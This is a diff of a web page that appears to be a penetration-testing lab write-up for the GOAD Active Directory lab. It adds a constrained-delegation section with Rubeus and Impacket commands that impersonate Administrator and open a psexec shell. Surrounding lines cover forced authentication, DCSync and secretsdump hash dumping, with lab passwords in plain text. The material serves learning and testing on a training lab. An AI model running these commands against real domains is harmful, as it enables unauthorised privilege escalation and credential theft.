@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#silver-ticket_1" title="Silver Ticket">Silver Ticket</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a><ul><li><a class="toc-href" href="#alternative-1" title="Alternative 1">Alternative 1</a></li><li><a class="toc-href" href="#alternative-2" title="Alternative 2">Alternative 2</a></li></ul></li><li><a class="toc-href" href="#golden-ticket_1" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#silver-ticket_1" title="Silver Ticket">Silver Ticket</a></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -756,7 +756,7 @@ lsadump::dcsync /user:arya.stark
 <div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--target-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>--listener-ip<span class="w"> </span><span class="m">10</span>.1.0.11
 </code></pre></div>
 <p><img alt="north-unconstrained-delegation-force-auth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-unconstrained-delegation-force-auth.png"/></p>
-<p>Convert Base64 ticket to kirbi format to ccache format with Impacket's <code>ticket</code></p>
+<p>Convert Base64 ticket to kirbi format to ccache format with Impacket's <code>ticketConverter</code></p>
 <div class="highlight"><pre><span></span><code>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>-d<span class="w"> </span>kingslanding.b64<span class="w"> </span>&gt;<span class="w"> </span>kingslanding.kirbi
 impacket-ticketConverter<span class="w"> </span>kingslanding.kirbi<span class="w"> </span>kingslanding.ccache
 </code></pre></div>
@@ -765,7 +765,45 @@ impacket-ticketConverter<span class="w"> </span>kingslanding.kirbi<span class="w
 </code></pre></div>
 <p><img alt="north-unconstrained-delegation-pass-the-ticket.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-unconstrained-delegation-pass-the-ticket.png"/></p>
 <h2 id="constrained-delegation">Constrained Delegation</h2>
-<h2 id="golden-ticket">Golden Ticket</h2>
+<h3 id="alternative-1">Alternative 1</h3>
+<p>Enumerate users with constrained delegation enabled:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span> <span class="o">-ne</span> <span class="s2">"$null"</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">msDS-AllowedToDelegateTo</span> <span class="p">|</span> <span class="nb">select </span><span class="n">DistinguishedName</span><span class="p">,</span> <span class="n">msDS-AllowedToDelegateTo</span>
+</code></pre></div>
+<p><img alt="Pasted image 20250215120621.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215120621.png"/></p>
+<p>Having <code>jon.snow</code> credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN <code>CIFS/winterfell.north.sevenkingdoms.local</code></p>
+<p>Request TGT for <code>jon.snow</code>:</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:jon.snow<span class="w"> </span>/password:iknownothing<span class="w"> </span>/domain:north.sevenkingdoms.local<span class="w"> </span>/outfile:jon.snow.tgt.kirbi
+</code></pre></div>
+<p><img alt="Pasted image 20250215120928.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215120928.png"/></p>
+<p>Execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code>:</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:jon.snow.tgt.kirbi<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:north.sevenkingdoms.local<span class="w"> </span>/msdsspn:CIFS/winterfell.north.sevenkingdoms.local<span class="w"> </span>/dc:north.sevenkingdoms.local<span class="w"> </span>/ptt
+</code></pre></div>
+<p><img alt="Pasted image 20250215121332.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121332.png"/></p>
+<p>On the attacker machine, convert Base64 ticket to kirbi format to ccache format with Impacket's <code>ticketConverter</code></p>
+<div class="highlight"><pre><span></span><code>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>-d<span class="w"> </span>jon.snow.s4u.administrator.b64<span class="w"> </span>&gt;<span class="w"> </span>jon.snow.s4u.administrator.kirbi
+impacket-ticketConverter<span class="w"> </span>jon.snow.s4u.administrator.kirbi<span class="w"> </span>jon.snow.s4u.administrator.ccache
+</code></pre></div>
+<p>Run psexec with resulting ticket:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>jon.snow.s4uproxy.administrator.ccache
+impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span>winterfell.north.sevenkingdoms.local
+</code></pre></div>
+<p><img alt="Pasted image 20250215121618.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121618.png"/></p>
+<h3 id="alternative-2">Alternative 2</h3>
+<p>Enumerate users with constrained delegation enabled:</p>
+<div class="highlight"><pre><span></span><code>impacket-findDelegation<span class="w"> </span>north.sevenkingdoms.local/robb.stark:sexywolfy<span class="w"> </span>-target-domain<span class="w"> </span>north.s
+</code></pre></div>
+<p><img alt="Pasted image 20250215121817.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121817.png"/></p>
+<p>Having <code>jon.snow</code> credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN <code>CIFS/winterfell.north.sevenkingdoms.local</code></p>
+<p>Request TGT for <code>jon.snow</code> and execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-getST<span class="w"> </span>-spn<span class="w"> </span>CIFS/winterfell.north.sevenkingdoms.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>north.sevenkingdoms.local/jon.snow:iknownothing
+</code></pre></div>
+<p><img alt="Pasted image 20250215122344.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215122344.png"/></p>
+<p>Run psexec with resulting ticket:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
+impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span>winterfell.north.sevenkingdoms.local
+</code></pre></div>
+<p><img alt="Pasted image 20250215121618.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121618.png"/></p>
+<h2 id="golden-ticket_1">Golden Ticket</h2>
 <h3 id="child-domain-to-parent">Child domain to parent</h3>
 <p>Dump NTLM hashes and Kerberos keys:</p>
 <div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>robb.stark:sexywolfy@winterfell.north.sevenkingdoms.local
